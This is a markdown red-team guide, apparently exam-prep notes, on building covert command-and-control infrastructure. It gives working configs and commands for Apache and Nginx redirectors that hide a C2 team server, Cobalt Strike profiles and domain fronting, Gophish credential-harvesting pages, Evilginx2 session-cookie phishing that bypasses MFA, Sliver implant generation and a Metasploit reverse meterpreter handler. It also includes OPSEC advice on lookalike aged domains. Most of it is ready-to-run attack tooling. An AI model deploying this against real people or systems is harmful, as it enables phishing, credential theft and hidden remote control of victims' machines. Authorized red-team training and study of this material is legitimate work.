# Red Team Infrastructure

Complete guide for building resilient Command & Control (C2) infrastructure - essential for advanced AD environments.

---

## Table of Contents
1. [Infrastructure Design](#1-infrastructure-design)
2. [HTTP(S) Redirectors](#2-https-redirectors)
3. [Domain Fronting](#3-domain-fronting)
4. [SMTP Relays & Phishing](#4-smtp-relays--phishing)
5. [C2 Frameworks](#5-c2-frameworks)
6. [OPSEC Considerations](#6-opsec-considerations)

---

## 1. Infrastructure Design

### 1.1 Basic Architecture

```
Victim → Redirector → Team Server → Operator
         (Public)     (Hidden)
```

**Components:**
- **Team Server**: Hosts C2 (Cobalt Strike, Sliver, etc.)
- **Redirector**: Forwards traffic, hides team server
- **Domain**: Categorized, aged domain
- **SSL Certificate**: Valid HTTPS cert (Let's Encrypt)

---

### 1.2 Multi-Tier Design

```
Victims
  ↓
CDN (Cloudflare)
  ↓
HTTP Redirectors (multiple)
  ↓
Team Server (hidden)
```

**Advantages:**
- Hides team server IP
- Resilient (multiple redirectors)
- Easy to burn/replace redirectors

---

## 2. HTTP(S) Redirectors

### 2.1 Apache mod_rewrite Redirector

**Setup:**
```bash
# Install Apache
apt update && apt install apache2

# Enable modules
a2enmod rewrite proxy proxy_http ssl headers

# Create config
nano /etc/apache2/sites-available/redirector.conf
```

**Config (/etc/apache2/sites-available/redirector.conf):**
```apache
<VirtualHost *:80>
    ServerName legitimate-domain.com

    # Logging
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

    # Redirect non-matching traffic to benign site
    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/valid-c2-path
    RewriteRule ^.*$ https://www.microsoft.com/? [L,R=302]

    # Forward C2 traffic to team server
    RewriteCond %{REQUEST_URI} ^/valid-c2-path
    RewriteRule ^.*$ https://10.10.10.100%{REQUEST_URI} [P,L]
    ProxyPassReverse / https://10.10.10.100/

    # Security headers
    Header always set X-Robots-Tag "noindex, nofollow"
</VirtualHost>

<VirtualHost *:443>
    ServerName legitimate-domain.com

    SSLEngine On
    SSLCertificateFile /etc/letsencrypt/live/legitimate-domain.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/legitimate-domain.com/privkey.pem

    # Same rules as above
    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/valid-c2-path
    RewriteRule ^.*$ https://www.microsoft.com/? [L,R=302]

    RewriteCond %{REQUEST_URI} ^/valid-c2-path
    RewriteRule ^.*$ https://10.10.10.100%{REQUEST_URI} [P,L]
    ProxyPassReverse / https://10.10.10.100/
</VirtualHost>
```

**Enable:**
```bash
a2ensite redirector.conf
systemctl restart apache2
```

**SSL Certificate (Let's Encrypt):**
```bash
apt install certbot python3-certbot-apache
certbot --apache -d legitimate-domain.com
```

---

### 2.2 Advanced Filtering (User-Agent, JA3)

**User-Agent Filtering:**
```apache
# Only allow specific User-Agent
RewriteCond %{HTTP_USER_AGENT} !^MyCustomAgent
RewriteRule ^.*$ https://www.microsoft.com/? [L,R=302]
```

**IP Whitelisting:**
```apache
# Only allow specific IPs (known victim networks)
RewriteCond %{REMOTE_ADDR} !^192\.168\.50\.
RewriteRule ^.*$ https://www.microsoft.com/? [L,R=302]
```

---

### 2.3 Nginx Redirector

**Config (/etc/nginx/sites-available/redirector):**
```nginx
server {
    listen 80;
    listen 443 ssl;
    server_name legitimate-domain.com;

    ssl_certificate /etc/letsencrypt/live/legitimate-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/legitimate-domain.com/privkey.pem;

    # Default: redirect to benign site
    location / {
        return 302 https://www.microsoft.com;
    }

    # C2 path: proxy to team server
    location /valid-c2-path {
        proxy_pass https://10.10.10.100;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

---

## 3. Domain Fronting

### 3.1 Cloudflare Domain Fronting

**Setup:**
1. Point domain to Cloudflare
2. Enable proxy (orange cloud)
3. Set up SSL (Full mode)

**Cobalt Strike Profile:**
```
http-get {
    set uri "/api/v1/updates";

    client {
        header "Host" "legitimate.cloudfront.net";
        header "User-Agent" "Mozilla/5.0";

        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }

    server {
        header "Server" "nginx";
        header "Content-Type" "application/json";

        output {
            base64url;
            print;
        }
    }
}
```

**Traffic Flow:**
```
Victim → cdn.legitimate.com (Host: target.cloudfront.net) → Cloudflare → Team Server
```

---

### 3.2 Azure/AWS CDN Fronting

**AWS CloudFront:**
```
1. Create CloudFront distribution
2. Origin: Your team server domain
3. Alternate domain names (CNAMEs): legitimate-domain.com
4. SSL: Use ACM certificate
```

**Request:**
```
Host: legitimate-domain.com
X-Forwarded-Host: team-server.example.com
```

**Note:** AWS/Azure have mitigations, less reliable than before.

---

## 4. SMTP Relays & Phishing

### 4.1 Sendmail Relay

**Setup:**
```bash
apt install sendmail sendmail-cf m4

# Configure
nano /etc/mail/sendmail.mc
```

**Config:**
```
define(`SMART_HOST', `smtp.gmail.com')dnl
define(`RELAY_MAILER_ARGS', `TCP $h 587')dnl
define(`ESMTP_MAILER_ARGS', `TCP $h 587')dnl
define(`confAUTH_OPTIONS', `A p')dnl
TRUST_AUTH_MECH(`EXTERNAL DIGEST-MD5 CRAM-MD5 LOGIN PLAIN')dnl
define(`confAUTH_MECHANISMS', `EXTERNAL GSSAPI DIGEST-MD5 CRAM-MD5 LOGIN PLAIN')dnl
FEATURE(`authinfo',`hash -o /etc/mail/authinfo.db')dnl
```

**Auth Info (/etc/mail/authinfo):**
```
AuthInfo:smtp.gmail.com "U:your_email@gmail.com" "P:your_password"
```

**Build & Restart:**
```bash
makemap hash /etc/mail/authinfo < /etc/mail/authinfo
m4 /etc/mail/sendmail.mc > /etc/mail/sendmail.cf
systemctl restart sendmail
```

---

### 4.2 Gophish Phishing Server

**Install:**
```bash
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish
./gophish
```

**Access:** https://localhost:3333 (admin:gophish)

**Setup Campaign:**
1. Create email template (credential harvesting)
2. Create landing page (clone legitimate login)
3. Set up sending profile (SMTP relay)
4. Import targets (CSV)
5. Launch campaign

**Credential Harvesting:**
```html
<!-- Landing page form -->
<form action="" method="POST">
    <input type="text" name="username" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Sign In">
</form>
```

---

### 4.3 Evilginx2 (Reverse Proxy Phishing)

**Install:**
```bash
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
./bin/evilginx
```

**Setup:**
```
config domain legitimate-phish.com
config ipv4 10.10.10.100

# Use Office365 phishlet
phishlets hostname o365 legitimate-phish.com
phishlets enable o365

# Create lure
lures create o365
lures get-url 0
```

**Result:** Captures session cookies (bypasses MFA!)

---

## 5. C2 Frameworks

### 5.1 Cobalt Strike Setup

**Team Server:**
```bash
# Start team server
./teamserver 10.10.10.100 MySecurePassword c2profile.profile

# Port 50050 for client connections
```

**Malleable C2 Profile:**
```
# Custom profile for stealth
set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";

http-get {
    set uri "/api/updates";

    client {
        header "Accept" "application/json";
        metadata {
            base64url;
            parameter "id";
        }
    }

    server {
        header "Server" "nginx/1.18.0";
        output {
            base64url;
            print;
        }
    }
}
```

---

### 5.2 Sliver C2

**Install:**
```bash
curl https://sliver.sh/install | sudo bash
sliver-server
```

**Generate Implant:**
```
sliver > generate --http 10.10.10.100:443 --save /tmp/implant.exe
```

**Start Listener:**
```
sliver > http --lhost 0.0.0.0 --lport 443
```

---

### 5.3 Mythic C2

**Install:**
```bash
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic
./install_docker_ubuntu.sh
./start_mythic.sh
```

**Access:** https://localhost:7443

---

## 6. OPSEC Considerations

### 6.1 Domain Selection

**Good Domains:**
- Aged (>1 year old)
- Categorized as benign (Blue Coat, etc.)
- Legitimate TLD (.com, .net, .org)
- Similar to target company naming

**Categorization:**
```bash
# Submit to categorization
# BlueCoat: sitereview.bluecoat.com
# Fortinet: www.fortiguard.com/webfilter
```

---

### 6.2 SSL/TLS Best Practices

**Valid Certificate:**
```bash
# Let's Encrypt (free, automated)
certbot certonly --standalone -d c2-domain.com
```

**Certificate Pinning (Avoid):**
- Use common CA (Let's Encrypt)
- Don't use self-signed

---

### 6.3 Traffic Shaping

**Beacon Configuration:**
```
# Cobalt Strike
set sleeptime "60000";  # 60 seconds
set jitter    "30";      # ±30% variance
```

**Random Sleep:**
```python
import time
import random

def callback():
    sleep_time = random.randint(30, 90)
    time.sleep(sleep_time)
```

---

### 6.4 Firewall Rules (Team Server)

**iptables:**
```bash
# Only allow connections from redirectors
iptables -A INPUT -p tcp --dport 443 -s 10.10.10.50 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j DROP

# Log blocked attempts
iptables -A INPUT -j LOG --log-prefix "BLOCKED: "
```

---

## 7. OSCP Practical Setup

### Quick Redirector (OSCP Lab):

```bash
# Simple Apache redirector
apt update && apt install apache2
a2enmod proxy proxy_http
systemctl restart apache2

# Forward all traffic
cat > /etc/apache2/sites-available/000-default.conf << 'EOF'
<VirtualHost *:80>
    ProxyPass / http://10.10.10.100/
    ProxyPassReverse / http://10.10.10.100/
</VirtualHost>
EOF

systemctl restart apache2
```

### Quick C2 (Metasploit):

```bash
# Reverse HTTPS handler
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 10.10.10.100
set LPORT 443
set ExitOnSession false
exploit -j
```

---

## 8. Tools Summary

| Tool | Purpose | OSCP Relevant |
|------|---------|---------------|
| **Apache** | HTTP redirector | ✅ Yes |
| **Cobalt Strike** | Premium C2 | ❌ No (licensed) |
| **Sliver** | Open-source C2 | ⚠️ Maybe |
| **Metasploit** | Framework | ✅ Yes (limited) |
| **Gophish** | Phishing | ⚠️ Social engineering |
| **Evilginx2** | MFA bypass phishing | ❌ Advanced |

---

## 9. References
- Red Team Notes: https://www.ired.team/offensive-security/red-team-infrastructure
- Cobalt Strike Docs: https://www.cobaltstrike.com/
- Redirectors: https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/

---

**OSCP Note:** Focus on basic Apache redirectors and Metasploit handlers. Advanced C2 frameworks not required for exam but useful for AD labs.
